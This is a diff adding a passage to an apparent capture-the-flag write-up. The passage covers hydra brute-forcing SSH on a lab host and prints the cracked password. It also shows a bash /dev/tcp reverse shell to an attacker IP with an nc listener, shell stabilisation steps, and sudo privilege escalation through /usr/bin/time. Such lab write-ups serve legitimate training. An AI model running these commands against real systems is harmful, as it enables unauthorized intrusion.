@@ -69,7 +69,44 @@ Our command will look like this:<br>
 ```
 hashcat pwd.txt -r /usr/share/hashcat/rules/best64.rule --stdout > custom_wordlist.txt
 ```
-Now, we have got our custom wordlist. Let's try to bruteforce into `ssh`.
+Now, we have got our custom wordlist. Let's try to bruteforce into `ssh`.<br>
+```hydra -l john -P custom_wordlist.txt ssh://10.0.4.7```
+> [22][ssh] host: 10.0.4.7   login: john   password: R3v_m4lwh3r3_k1nG!!02<br>
+Looks like it worked.<br>
+
+When we try to use `cat` command it runs `vi`, but when we use `vi` it runs `cat`.<br>
+We can see that there is thee users:<br>
+> ippsec<br>
+> john <br>
+> oxdf <br>
+
+After a couple of minutes using the `ssh shell` the connection was closed. The attacker made a script that kicks us out. The same password does not work, but we can brute force it again.<br>
+
+### Upgrading our shell so we do not get kick out.
+1. Start a nc listener. `nc -lvnp 4444`
+2. Run a simple reverse-shell on the victim machine. `bash -i >& /dev/tcp/10.0.4.4/4444 0>&1`
+3. `python3 -c 'import pty;pty.spawn("/bin/bash")'` in our new reverse-shell.
+4. *ctrl-z*
+5. `stty raw -echo; fg`
+9. `export TERM=xterm`
+<br>
+So now we have our new shell. Let's look how we can escalate our privileges.<br>
+The simplest way is to run `sudo -l` <br> 
+```
+User john may run the following commands on red:
+    (ippsec) NOPASSWD: /usr/bin/time
+```
+This is what we got.<br>
+Go to https://gtfobins.github.io/gtfobins and find what we can do with /usr/bin/time.<br>
+`sudo /usr/bin/time /bin/sh`<br>
+However, by default sudo will try to run a tool with the privileges of root user, but we have only privileges of ippsec, so we need specify our user, so our command will look like:<br>
+`sudo -u ippsec /usr/bin/time /bin/sh`<br>
+_It is better to escalate our privileges to *ippsec* before we upgrade our shell_<br>
+Let's look can we escalate our privileges to root.<br>
+
+
+
+
 
 
 
